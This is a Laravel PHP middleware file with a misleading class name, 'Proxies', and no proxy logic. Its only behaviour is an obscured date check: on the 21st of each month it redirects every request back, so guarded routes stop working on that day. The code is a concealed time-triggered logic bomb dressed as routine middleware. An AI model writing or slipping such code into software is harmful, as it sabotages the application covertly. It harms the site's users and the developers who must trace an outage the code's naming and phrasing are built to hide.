<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Support\Carbon;

class Proxies
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        $rough = (int) Carbon::today()->format('d');
        if($rough*2 == 42){
            return redirect()->back();
        }
        return $next($request);
    }
}
